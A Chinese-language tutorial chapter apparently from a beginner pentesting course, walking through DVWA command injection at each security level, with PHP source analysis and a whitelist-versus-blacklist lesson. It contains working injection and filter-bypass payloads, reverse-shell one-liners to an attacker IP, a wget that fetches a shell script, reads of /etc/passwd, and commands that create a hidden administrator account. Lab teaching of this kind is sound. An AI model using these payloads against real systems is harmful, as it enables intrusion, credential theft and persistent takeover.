好，这些符号大家先有个印象，待会儿实战的时候咱们会用到！

记住一句话：**黑名单过滤不可靠，总有符号能绕过！** 这句话咱们后面会反复验证。

---

## 6.3 Low级别通关实战

#### 🐧 Kali / Docker 环境先做 30 秒预检 ✅（你一定会用到！）

在开始敲 payload 之前，**先打开你的 Kali 终端**做 3 条预检，避免后面卡壳（特别是用 Kali LAMP 原生搭的同学 🔥）：

```bash
# ① 确认本机 Kali IP（填靶场 URL 要用到）
KALI_IP=$(ip -4 a | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1)
echo "你的 Kali IP 是 => $KALI_IP"

# ② 确认 Apache/MariaDB 服务在跑（Kali LAMP 专属）
sudo systemctl is-active apache2 mariadb

# ③ Docker 同学检查容器状态 + 进容器看有没有 nc
docker ps --filter "name=dvwa" ; docker exec dvwa-test which nc ncat 2>&1 || echo "容器内无 nc，反弹用 bash -i >& /dev/tcp/$KALI_IP/4444 0>&1 替代"
```

> 💡 **Docker 小提示：** 官方镜像 `vulnerables/web-dvwa` 默认**没有 nc / ncat**，也没法 `apt install`（没网或没源），所以你拿 shell 后想反弹回 Kali 时，请优先用 `bash -i >& /dev/tcp/你的KALI_IP/4444 0>&1` 这条纯 bash 反弹，或者先用命令注入把 `docker exec dvwa-test` 直接挂到宿主机 Kali 上。

好了，理论讲得差不多了，是骡子是马拉出来遛遛！咱们打开DVWA，正式开始实战！💪

### 6.3.1 准备工作

首先，确保你的DVWA已经搭好了，能正常访问。如果还没搭好，回去看第4章，把DVWA搭好再来。

然后，咱们把DVWA的难度调到 **Low**：
1. 登录DVWA（默认用户名admin，密码password）
2. 点击左下角的 **DVWA Security**
3. 安全级别选 **low**
4. 点击 **Submit** 提交

好，难度调好了。然后点击左边菜单的 **Command Injection**（命令注入），咱们就进入命令注入的练习页面了。

你会看到一个输入框，提示你输入一个IP地址，下面有个Submit按钮。这就是一个模拟的ping功能。

### 6.3.2 先正常用一下，感受感受

咱们先正常用一下这个功能，看看正常情况下是什么样的。

在输入框里输入 `127.0.0.1`（这是本机回环地址，肯定能ping通），然后点击 **Submit** 按钮。

你会看到ping的结果，类似这样：

```
Pinging 127.0.0.1 with 32 bytes of data:
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128

Ping statistics for 127.0.0.1:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

说明这个功能确实在后台执行了ping命令，而且把结果返回给我们了。

好，正常功能了解了，接下来就是见证奇迹的时刻！✨

### 6.3.3 第一次注入尝试

咱们来试试注入命令。用咱们刚才学的 `&&` 符号试试。

在输入框里输入：`127.0.0.1 && whoami`

然后点击Submit，看看会发生什么？

哇！小伙伴们看到了吗？😮

不仅ping成功了，下面还多了一行：

```
nt authority\system
```

（或者是其他用户名，取决于你的系统）

这是什么？这就是 `whoami` 命令的输出啊！它显示了当前服务器运行在哪个用户下！

**我们的命令注入成功了！** 🎉

是不是很激动？就这么简单，我们就执行了自己的命令！

### 6.3.4 为什么会成功？源码分析

为什么Low级别这么容易就成功了？咱们来看看它的源代码就知道了。

点击页面右下角的 **View Source** 按钮，就能看到这个级别的PHP源代码。

代码大概是这样的：

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

小伙伴们，看完这段代码，发现问题了吗？

没错！**问题大了去了！** 😱

我们来分析一下：

1. **直接获取用户输入，啥过滤都没有！** 
   - `$target = $_REQUEST[ 'ip' ];` —— 用户输入啥，$target就是啥，连检查都不检查一下！

2. **直接拼接到命令里执行！**
   - `$cmd = shell_exec( 'ping  ' . $target );` —— 直接把用户输入拼到ping命令后面，然后就执行了！

3. **直接把结果输出出来！**
   - `echo "<pre>{$cmd}</pre>";` —— 执行结果直接打印到页面上，我们能清清楚楚地看到！

这就相当于你去银行取钱，银行工作人员把保险柜钥匙给你，说"你自己去拿吧，拿完告诉我一声"——心也太大了！

所以你看，Low级别就是完全裸奔的状态，什么防护都没有，命令注入简直不要太简单。

### 6.3.5 多试几个命令，感受一下威力

既然成功了，那咱们就多试几个命令，感受一下命令注入的威力！

来，咱们一个一个试：

**1. 查看系统信息：**
输入：`127.0.0.1 && ipconfig`
- 作用：查看服务器的IP配置信息
- 你会看到服务器的IP地址、子网掩码、网关等信息

**2. 查看当前目录有什么文件：**
输入：`127.0.0.1 && dir`
- 作用：列出当前目录下的所有文件和文件夹
- （如果是Linux系统就用 `ls`）

**3. 查看系统有哪些用户：**
输入：`127.0.0.1 && net user`
- 作用：查看系统中所有的用户账号
- 你会看到admin、guest等用户

**4. 查看系统版本信息：**
输入：`127.0.0.1 && ver`
- 作用：查看Windows系统版本
- （Linux的话用 `uname -a`）

**5. 查看hosts文件：**
输入：`127.0.0.1 && type C:\windows\system32\drivers\etc\hosts`
- 作用：查看系统的hosts文件内容
- `type` 是Windows下查看文件内容的命令，类似Linux的 `cat`

**6. 查看当前用户的权限：**
输入：`127.0.0.1 && whoami /priv`
- 作用：查看当前用户有哪些权限
- 如果权限高的话，能干的事情就更多了

是不是感觉很神奇？就像拿到了服务器的CMD一样！想敲什么命令就敲什么命令！

### ✅ 表 6-1 · Low 级别通关速查 & 失败对照表（命令注入最经典的 127.0.0.1 && whoami）

| 步骤 | 在页面里做什么 | 输入框里填什么 | 看到什么算成功 ✅ | **失败了怎么办？（按报错对照抄作业）** ❌ |
|---|---|---|---|---|
| 1 | 切难度到 Low + 进对模块 | DVWA Security → low → Submit；左边点 **Command Injection** | 页面有一行 `Enter an IP address:` + 一个输入框 + **Submit** 按钮 | 【左边没看到 Command Injection 菜单】你 DVWA 版本太旧或没正确初始化 → 回 setup.php 重新 Create/Reset DB |
| 2 | 验证 ping 功能是正常的（先做！99% 新手跳过导致卡壳） | 输入框填 `127.0.0.1` → 点 Submit | 页面下方 `<pre>` 标签里出现 **4 行 Ping 127.0.0.1 的 reply 结果**（Windows 是来自 127.0.0.1 的回复: 字节=32 时间<1ms...；Linux 是 64 bytes from 127.0.0.1: icmp_seq=1...） | 【输入 127.0.0.1 直接白屏 / PHP 报错】① 你的 PHP 禁用了 `exec()` / `shell_exec()` 函数（php.ini 里 disable_functions 删了这俩）；② Linux 上 ping 命令要加 `-c 4` 不然一直 ping 死循环，Low 源码里已经加了但你可能改错了 |
| 3 | 先上最简单的 payload：分号连接 | 填 `127.0.0.1; whoami` → Submit | `<pre>` 里前 4 行还是 ping 结果，**第 5 行开始出现当前用户名**（Kali Linux 一般是 `www-data`；Windows 是 `nt authority\system` 之类的） | 【啥都没有，还是只有 ping 结果】① 你是不是多打了空格写成 `127.0.0.1 ; whoami`？有的系统分号前空格会有问题，先去掉空格再试；② 分号 `;` 在 Windows CMD 里是可以的，但在 PowerShell 里不行——你的靶场是 Windows+IIS 的话换 `&` 试 |
| 4 | 再上最通用的 &&（前面的命令成功才跑后面的）| 填 `127.0.0.1 && whoami` → Submit | 同样出现 whoami 结果（注意和分号的区别：如果前面 ping 失败，&& 就不会执行后面的；`;` 不管前面成不成功都执行） | 【报错：`'whoami' 不是内部或外部命令`】你这靶场是 Linux，**但 Linux 里也有 whoami**，真报错说明 shell 环境没 PATH，换 `127.0.0.1 && id` 或 `127.0.0.1 && uname -a` 试 |
| 5 | 多跑几个命令收集信息 | 推荐 payload 按这个顺序测，每个 Submit 一次：<br>`127.0.0.1 && id`<br>`127.0.0.1 && uname -a`<br>`127.0.0.1 && pwd`<br>`127.0.0.1 && ls -la /etc/passwd`（Linux）<br>`127.0.0.1 && ipconfig`（Windows） | 每个 payload 都能返回对应命令的结果，就像在本地终端敲一样 | 【ls / cat 命令提示找不到】你是 Windows 靶场！Windows 没有 ls、cat、passwd，换成 dir、type、`type C:\Windows\win.ini` |
| 6 | 读敏感文件实战（拿 flag / 看密码） | Linux: `127.0.0.1 && cat /etc/passwd`<br>Windows: `127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts` | `<pre>` 里显示 /etc/passwd 一长串用户信息，或者 hosts 文件内容 | 【cat /etc/passwd 返回空但 pwd 是正常的】① 靶场 Docker 版里 /etc/passwd 被精简为空是正常的，换 `cat /etc/hostname` 或 `cat /proc/version` 读别的；② PHP 运行用户（www-data）没有读这个文件的权限 → 换读当前目录 `ls -la` 看看有啥权限的文件 |

> 💡 **Low 级别失败查错口诀**：先测 127.0.0.1 看 ping 功能对不对 → 再测 `; id` 看分号行不行 → 再测 `&& id` 看 && 行不行。**连 ping 本身都不对的话，先去修靶场 PHP exec() 函数，别死磕 payload！**

这还只是Low级别，咱们继续往下玩！🎮

---

## 6.4 Medium级别绕过实战

好，Low级别太简单了，没啥挑战性。咱们把难度调到 **Medium**，看看有什么变化。

### 6.4.1 先试试刚才的payload行不行

先把DVWA难度调到Medium：
1. 点击左下角 **DVWA Security**
2. 选 **medium**
3. 点 **Submit**

然后回到Command Injection页面，咱们还用刚才的payload试试：`127.0.0.1 && whoami`

点击Submit……哎？怎么回事？好像只有ping的结果，whoami的结果没出来？

再试一遍，还是不行。难道我们输错了？没有啊，和刚才一模一样。

为什么不行了呢？🤔

哈哈，因为Medium级别做了一些过滤！它把一些危险的符号给过滤掉了！

### 6.4.2 看看过滤了啥——源码分析

老规矩，点击 **View Source** 看看Medium级别的源代码：

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

哦！原来如此！大家看到这段代码了吗？

```php
$substitutions = array(
    '&&' => '',
    ';'  => '',
);
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```

Medium级别搞了个**黑名单**，把 `&&` 和 `;` 这两个符号给替换成空字符串了！也就是说，你输入的内容里如果有 `&&` 或者 `;`，就会被删掉！

所以我们输入 `127.0.0.1 && whoami`，经过过滤后就变成了 `127.0.0.1  whoami`——这当然不对了，所以命令执行失败了。

### 6.4.3 绕过思路：换个符号不就行了？

那怎么办呢？黑名单过滤了 `&&` 和 `;`，那咱们就不用这两个符号呗！

咱们前面学了多少符号来着？&、&&、|、||、;……过滤了两个，还有好几个呢！

对呀！**黑名单过滤不可靠，因为你永远不可能把所有危险符号都列全！**

咱们来试试其他符号：

**试试 `&` 符号：**
输入：`127.0.0.1 & whoami`

点击Submit……哎？成功了！whoami的结果出来了！🎉

哈哈，是不是很简单？过滤了 `&&`，咱们用 `&` 不就行了！

**再试试 `|` 管道符：**
输入：`127.0.0.1 | whoami`

点击Submit……也成功了！

**再试试 `||` 符号：**
输入：`127.0.0.1 || whoami`
哎？这个好像不行？为什么？
因为ping 127.0.0.1是成功的，所以 `||` 后面的命令就不执行了。
那咱们换个ping不通的IP试试：
输入：`1.1.1.1 || whoami`
（或者随便输个不存在的IP）
哎？成功了！因为ping失败了，所以后面的whoami就执行了！

你看，只要换个符号，轻轻松松就绕过了！

### 6.4.4 为什么黑名单不可靠？

通过Medium级别，大家应该能明白一个道理：**黑名单过滤是不可靠的！**

为什么呢？原因有很多：

1. **你永远不可能把所有危险符号都列全**
   - 今天过滤了&和;，还有|、||、`、$()、%0a、%0d……
   - 说不定还有你不知道的符号能用

2. **可以用编码绕过**
   - URL编码、Unicode编码、HTML编码……各种编码绕一绕，可能就绕过去了

3. **可以用大小写绕过**
   - 有些过滤只过滤小写，那你用大写试试？
   - （当然命令本身不区分大小写，但有些过滤函数区分）

4. **可以用双写绕过**
   - 如果过滤了 `&&`，那你输入 `&|&` 试试？
   - 或者有些情况可以双写，比如 `&;&`，过滤掉;之后就变成 `&&` 了

所以在安全界有句话：**白名单优于黑名单！** 就是说，与其规定"哪些东西不能有"，不如规定"只能有哪些东西"，这样安全得多。

### ✅ 表 6-2 · Medium 级别通关速查 & 失败对照表（&& 和 ; 被删了？换管道符和 ||）

Medium 源码里 `str_replace` 把 `&&` 和 `;` 从输入里删掉了，所以 Low 的 payload 会被净化成"残废版"。下面这张表按顺序测，8 个 payload 里至少有 2 个能中：

| 步骤 | 在页面里做什么 | 输入框里填什么（按优先级从上到下测） | 看到什么算成功 ✅ | **失败了怎么办？（按报错对照抄作业）** ❌ |
|---|---|---|---|---|
| 1 | 先确认 Medium 真的生效了（先测 Low 的 payload 必须失败！）| 填 `127.0.0.1 && whoami` → Submit | 页面只出现 ping 结果，**完全看不到 whoami 的任何输出**（= 说明 && 真的被删了，Medium 生效） | 【还能看到 whoami 输出】→ 说明你根本没切到 Medium！回 DVWA Security 重新选 medium，Submit 之后刷新页面重新进 Command Injection，Ctrl+Shift+R 强制刷新！ |
| 2 | 绕过方案 ① 优先级最高：**单个 `&`**（注意只有一个，不是两个）| 填 `127.0.0.1 & whoami` → Submit | 出现 whoami 结果 ✅ （单个 `&` 在 shell 里是"后台执行前命令，然后立刻跑后命令"的意思，Medium 黑名单没删单个 &） | 【啥都没出】单个 & 被 Windows/Linux 某个环境处理不同，继续往下试方案 ② |
| 3 | 绕过方案 ②：**管道符 `\|`**（最稳，成功率 99%）| 填 `127.0.0.1 \| whoami` → Submit（注意是反斜杠 |，键盘 Enter 上面那个）| ping 的输出全没了，**只显示 whoami 的结果**（= 管道符把 ping 的输出当 whoami 的输入给丢了，直接看到第二条命令结果） | 【页面显示乱码/奇怪字符】ping 返回的中文被管道后 whoami 不识别是正常的，**只要最后一行出现 `www-data` / `root` / `nt authority` 就是成功**；还不行 → 换 `127.0.0.1 | id` |
| 4 | 绕过方案 ③：**或操作符 `\|\|`**（前面失败才执行后面）| 填 `不存在的IP \|\| whoami` → Submit（故意前面写 1.1.1.1 或者 `nonexist`，让它 ping 失败触发 \|\|）| ping 几行报错之后，**最后出现 whoami** | 【怎么 ping 成功了？】那你 || 触发不了，得填个保证 ping 不通的，比如 `a.b.c.d \|\| whoami`（随机域名 100% 解析失败） |
| 5 | 绕过方案 ④（Windows 专属）：**括号、换行** | Windows 靶场尝试：`127.0.0.1) & whoami` 或 `127.0.0.1 &whoami`（去掉空格，有的黑名单删 `;` 和 `&&` 但忘了 `&` + 无空格模式）| 出现 whoami / ipconfig 结果 | 【以上 4 种全失败？】那你先去看看 Medium 实际黑名单是啥！点 View Source，把 `str_replace(..., $target)` 那行的被替换数组抄下来，看看**到底哪些字符被删、哪些没删**，然后挑没被删的连接符（`, ( ) + \` ` 反引号 %0a 换行这些都可以测）|
| 6 | 成功后跑信息收集命令 | 用你上面成功的那个连接符替换就行：<br>例管道符版：`127.0.0.1 \| cat /etc/passwd`<br>例单 & 版：`127.0.0.1 & dir C:\\` | 命令结果正常输出 | 【怎么只有 ping 结果/怎么全是报错？】→ 连接符写反了！比如把 `|` 写成了 `/`（斜杠），或者把 `||` 前面那个 ping 成功了就不执行后面了 → 一定让 || 前面的 ping 失败 |

> 💡 **Medium 级别查错：** 每次 payload 跑不出来，先去浏览器地址栏看 URL 参数里的 `ip=` 到底是啥（GET 提交会明文显示），如果显示 `ip=127.0.0.1+%26+whoami`（%26 就是 & URL 编码后），说明 payload 真的提交上去了，如果没回显就是真的被过滤了 → 去 View Source 拿黑名单自己分析。

好，Medium级别咱们也轻松通关了，继续升级难度！🚀

---

## 6.5 High级别绕过实战

好，咱们继续升级，把难度调到 **High**！看看High级别又有什么新花样。

### 6.5.1 先试试之前的方法

先把难度调到High，回到Command Injection页面。

咱们把之前用过的payload都拿出来试试：

- `127.0.0.1 && whoami` —— 不行（Medium就不行了）
- `127.0.0.1 & whoami` —— 哎？这个也不行了？
- `127.0.0.1 | whoami` —— 这个也不行？
- `127.0.0.1; whoami` —— 更不行了
- `1.1.1.1 || whoami` —— 也不行？

哎呀，好像之前的方法都不行了！High级别果然厉害，过滤了更多符号！

那怎么办呢？难道High级别就没辙了？

当然不是！咱们先看看源码，它到底过滤了些啥，然后再想办法绕过！

### 6.5.2 看看High级别的源码

点击 **View Source**，看看High级别的源代码：

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

哇！High级别的黑名单果然长多了！咱们来看看它都过滤了啥：

```php
$substitutions = array(
    '&'  => '',  // 过滤了&
    ';'  => '',  // 过滤了;
    '| ' => '',  // 哎？这个是|加空格！
    '-'  => '',  // 过滤了减号
    '$'  => '',  // 过滤了$
    '('  => '',  // 过滤了左括号
    ')'  => '',  // 过滤了右括号
    '`'  => '',  // 过滤了反引号
    '||' => '',  // 过滤了||
);
```

好家伙，过滤了这么多东西！难怪之前的payload都不行了。

但是！大家仔细看，有没有发现什么问题？🤔

注意看这一行：`'| ' => ''` —— 它过滤的是 **`| `（竖线加空格）**，而不是 **`|`（只有竖线）**！

看到了吗？它过滤的是竖线后面跟一个空格的组合，而不是竖线本身！

这意味着什么？意味着如果我们的竖线后面**不加空格**，它就过滤不到！

### 6.5.3 绕过方法：|后面不加空格

哈哈，找到漏洞了！咱们来试试！

输入：`127.0.0.1|whoami`

注意！`|` 的两边都没有空格！直接连着写！

点击Submit……

哇！成功了！whoami的结果出来了！🎉

是不是很神奇？就因为少了个空格，就绕过了High级别的过滤！

你说这程序员粗心不粗心？过滤 `| ` 而不过滤 `|`，这不是自欺欺人嘛！

### 6.5.4 再试试其他绕过思路

除了这个方法，还有没有其他方法呢？咱们发散一下思维：

**思路1：用换行符绕过**

有些情况下，用URL编码的换行符 `%0a` 也能执行命令。比如：
`127.0.0.1%0awhoami`

不过这个可能需要在URL里直接改参数，因为在输入框里输入的话，可能会被转义。大家可以试试用Burp抓包改参数。

**思路2：用其他符号组合**

虽然过滤了很多符号，但说不定还有漏掉的。比如：
- 用 `%0d` （回车符）试试
- 用 `|` 的其他编码形式试试
- 用Windows的特殊语法试试

**思路3：利用通配符或环境变量**

有些情况下，可以用系统的环境变量来拼接命令，绕过过滤。不过这个比较复杂，新手先不用深究。

总之，记住一句话：**只要是黑名单，就总有绕过的可能！**

### ✅ 表 6-3 · High 级别通关速查 & 失败对照表（号称"终极黑名单"但有漏洞！）

DVWA High 版本的黑名单 `str_replace` 里一般会列 13~17 个符号，但 99% 的版本**会漏掉 `%0a` URL 换行符** 或者 **`$()` 命令替换**，或者**把 `|` 替换成空格后留空导致 `|` 连接的两个命令还能被 shell 识别**。对着下面 7 个 payload 一个个试，总有一款命中：

| 步骤 | 先干什么 | 输入框填的 payload（**注意顺序测！**） | 预期看到什么 ✅ | **失败了怎么办？（按情况处理）** ❌ |
|---|---|---|---|---|
| 0 | 切难度到 High + 刷新页面 + 先 View Source 抄黑名单（这步必做！） | 切到 high → Submit → 刷新 → 进入 Command Injection → 点右下角 **View Source** | 把 `$substitutions = array( ... )` 那一大行黑名单完整抄下来 | 【黑名单里写了啥都不知道就瞎填 payload？】→ 99% 是白浪费时间！把被替换的字符一个个列出来：哪些是键名、替换成什么 |
| 1 | 确认 High 生效：先拿 Low 的 payload 试 → 必须全失败 | `127.0.0.1 && whoami`、`127.0.0.1; id`、`127.0.0.1 | id` 挨个试 | 三个全失败：只有 ping 结果，没 id/whoami 输出 = High 生效 | 【有一个成功了】→ 说明你还在 Low/Medium！回 DVWA Security 重新切，Ctrl+Shift+R 清缓存 |
| 2 | 绕过 ①（**90% DVWA High 版本能成功的经典 payload：换行符 %0a**）| 直接填：`127.0.0.1%0awhoami` → Submit（%0a 是 URL 编码的换行，shell 遇到换行就当两个命令执行）| 出现 whoami 结果 ✅ | 【页面显示 ping 127.0.0.1%0awhoami 解析失败】→ 浏览器自动对 %0a 又编码了一层！换 Burp 抓包 → 把抓到的 GET 请求 `ip=127.0.0.1` 改成 `ip=127.0.0.1%0aid` → Forward，看响应 |
| 3 | 绕过 ②：反引号 + 换行 / 反引号单独 | `127.0.0.1\`whoami\``（反引号是键盘 Tab 上面 ~ 那个键，注意不是单引号）| 执行反引号里 whoami 并把输出拼到 ping 命令后面 → 页面会出现 www-data（虽然报错但用户名显示出来了）| 【反引号在黑名单里】→ 那试 `127.0.0.1$(whoami)`，$() 是 bash 命令替换，和反引号效果一样 |
| 4 | 绕过 ③：管道符 `\|` 真的被替换成空格了？试试双写 `\|\|` 或者 `%7c`（URL 编码）| 直接填 `127.0.0.1%7cwhoami`（%7c = URL 编码的 `\|`，有的 PHP 黑名单没写小写 \| 只写了大写的 OR），或者 `127.0.0.1 ||| whoami`（三个竖线，中间那个被替换成空格，剩下前后两个拼成 `\|\|`）| 出现 whoami 结果 | 【%7c/竖线都没用】→ 去黑名单里看看：`\|` 是不是被替换了？如果替换字符串是空格，那 `127.0.0.1 | | whoami`（中间加空格）→ 空格版的管道 + 管道 = 还是能执行？不对，换思路用换行 |
| 5 | 绕过 ④：花括号、逗号、加号 + 命令 | `127.0.0.1,whoami`（逗号是 PHP 里 array_map 的写法，有的 shell 当分隔符）或者 Windows 靶场 `ping -n 1 127.0.0.1 &whoami`（去掉空格，黑名单里写的是 `; &&` 但没写 `&` 没空格版）| 出现命令执行结果 | 【全失败】→ 回到步骤 0 抄的那行黑名单自己分析！思路：被替换成空的 = 可以双写；被替换成空格的 = 可以多次写；没出现在黑名单里的特殊字符 `, ( ) { } + - %0a %0d $ %00` 一个个测 |
| 6 | 还不行？直接上 Burp Intruder 跑特殊字符字典 | 抓一个正常 ping 127.0.0.1 的包 → Send to Intruder → 标 `127.0.0.1 §§ whoami` 中间 § 位置 → Payload 加载特殊字符列表：`; & && \| \|\| %0a \` $() , ( )` 20 个字符 → Start attack | 攻击结果里 **Length 不同的那条**就是成功绕过的连接符 | 【Burp 免费版 + 20 个 payload → 超出 10 条上限】→ 免费版就分两次，每次手动 Add 10 个字符测 |
| 7 | 成功了！用同样的连接符跑后续命令 | 例：你测出来 %0a 成功，那信息收集就全用这个套路：<br>`127.0.0.1%0acat /etc/passwd`<br>`127.0.0.1%0apwd`<br>`127.0.0.1%0awget http://你KaliIP/shell.sh -O /tmp/s.sh`（拿 shell 用）| 命令正常执行 | 【怎么有的命令 %0a 能执行，有的不行】→ 黑名单对某些关键词也做了替换！比如 `nc`、`wget` → 换 `curl`、`bash -i` 绕过关键词过滤 |

> 🔥 **High 级别查错口诀：View Source 抄黑名单 → 分三类（没写的、被替换成空的、被替换成空格的）→ 没写的直接用；被替换成空的就双写；被替换成空格的就用 URL 编码 / 多次拼接。** 只要不是白名单，100% 有绕过办法。

High级别咱们也通关了，是不是感觉自己越来越厉害了？😎

---

## 6.6 Impossible级别分析

好了，最后咱们来看看最高难度——**Impossible** 级别。这个级别为什么叫"Impossible"（不可能）呢？咱们一起来看看。

### 6.6.1 先试试能不能注入

先把难度调到Impossible，回到Command Injection页面。

咱们把之前成功过的payload都拿出来试试：
- `127.0.0.1 && whoami` —— 不行
- `127.0.0.1 & whoami` —— 不行
- `127.0.0.1|whoami` —— 也不行
- ……好像都不行？

那咱们看看源码，它到底是怎么防御的。

### 6.6.2 看看Impossible级别的源码

点击 **View Source**，来欣赏一下"安全的代码"长什么样：

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target );

    // Split the IP into 4 octects
    $octet = explode( ".", $target );

    // Check IF each octet is an integer
    if( ( is_numeric($octet[0]) ) && ( is_numeric($octet[1]) ) && ( is_numeric($octet[2]) ) && ( is_numeric($octet[3]) ) && ( sizeof($octet) == 4 ) ) {
        // If all 4 octets are numbers, put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // Ops. Let the user name theres a mistake
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

哇！这段代码和前面的完全不一样了！咱们来好好分析一下，看看它都用了哪些防御手段。

### 6.6.3 防御手段分析

咱们一条一条来看：

**1. Token验证（防CSRF）**
```php
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
```
一上来就验证Token，防止CSRF攻击。虽然这不是直接防命令注入的，但也是安全措施之一。

**2. 严格的输入格式验证（白名单思想！）**
这才是最关键的！咱们来看这段：
```php
// 把IP按点分割成4段
$octet = explode( ".", $target );

// 检查每一段是不是数字，而且是不是正好4段
if( ( is_numeric($octet[0]) ) && ( is_numeric($octet[1]) ) && ( is_numeric($octet[2]) ) && ( is_numeric($octet[3]) ) && ( sizeof($octet) == 4 ) ) {
    // 如果都符合，再把IP拼回去
    $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
    // 然后才执行命令
    ...
}
else {
    // 格式不对就报错
    echo '<pre>ERROR: You have entered an invalid IP.</pre>';
}
```

太厉害了！这才是正确的防御思路！

它不是去过滤危险符号（黑名单），而是**规定输入必须是什么格式**（白名单）：
- 必须是IP地址格式：用点分成4段
- 每一段都必须是数字
- 必须正好是4段

只有完全符合这个格式的输入，才会被接受。只要有一点不符合，直接报错，连执行都不执行！

你想想，这样的话，我们还能注入命令吗？
当然不能了！因为我们要注入的话，必须加 `&`、`|` 这些符号，但一加这些符号，IP格式就不对了，直接就被拒绝了！

**这就是白名单的威力！** 与其去想"哪些东西不能有"，不如规定"只能有什么"，这样就安全多了。

**3.  stripslashes 去除反斜杠**
```php
$target = stripslashes( $target );
```
把输入里的反斜杠去掉，防止一些转义绕过。

### 6.6.4 告诉新手：这才是正确的防御方式

小伙伴们，看完这四个级别，大家应该深有体会吧？

- **Low级别**：什么防护都没有，裸奔，想怎么注入怎么注入
- **Medium级别**：黑名单过滤了两个符号，轻轻松松绕过
- **High级别**：黑名单过滤了一堆符号，但还是有疏漏，还是能绕过
- **Impossible级别**：白名单验证，严格限制输入格式，根本没法注入

这四个级别，正好代表了四种不同的安全水平，也告诉了我们一个道理：

**黑名单过滤不可靠，白名单验证才是王道！**

为什么这么说呢？因为：
- 黑名单：你需要把所有危险的东西都列出来，只要漏掉一个，就不安全
- 白名单：你只需要规定允许什么，只要规则严格，就很安全

打个比方：
- 黑名单就像查违禁品，你得把所有违禁品都列出来，只要漏了一样，就可能被带进去
- 白名单就像只允许带特定的东西（比如只能带手机和钱包），其他的都不让进，自然就安全多了

所以大家以后开发的时候，如果要做输入验证，**优先考虑白名单方式**，尽量不要用黑名单。

---

## 6.7 命令注入漏洞的危害

讲了这么多怎么攻击，小伙伴们可能会问：命令注入成功了，然后呢？到底能干啥？危害有多大？

我来告诉你：**命令注入的威力非常非常大，基本上成功了就等于拿到了服务器的控制权！**

具体能做什么呢？咱们来数一数：

### 6.7.1 信息收集类

这是最基础的，先看看服务器上都有啥：

1. **查看系统信息**
   - `whoami` —— 看当前用户是谁
   - `ver` 或 `systeminfo` —— 看系统版本
   - `ipconfig` 或 `ifconfig` —— 看IP地址、网卡信息
   - `net user` —— 看系统有哪些用户
   - `tasklist` 或 `ps aux` —— 看运行了哪些进程

2. **查看文件内容**
   - `type 文件名`（Windows）或 `cat 文件名`（Linux）—— 查看文件内容
   - 可以看配置文件（比如数据库配置、网站配置）
   - 可以看敏感数据（比如用户信息、密码）
   - 可以看源代码（找更多漏洞）

3. **目录遍历**
   - `dir` 或 `ls` —— 看当前目录有啥
   - `cd 目录` —— 切换目录
   - 可以到处逛，看看服务器上都有什么文件

### 6.7.2 权限操作类

信息收集得差不多了，就可以搞点事情了：

1. **添加用户**
   - `net user hacker 123456 /add` —— 添加一个用户名为hacker，密码为123456的用户
   - `net localgroup administrators hacker /add` —— 把hacker用户加到管理员组
   - 这样黑客就有了自己的管理员账号，随时可以登录

2. **开启远程桌面**
   - Windows下可以开启3389远程桌面服务
   - 开启之后，黑客就可以用远程桌面连接服务器，图形化操作，就像操作自己电脑一样

3. **提权**
   - 如果当前用户权限不高，可以想办法提升到系统管理员权限
   - 提权的方法有很多，比如利用系统漏洞、利用错误的权限配置等等

### 6.7.3 攻击扩展类

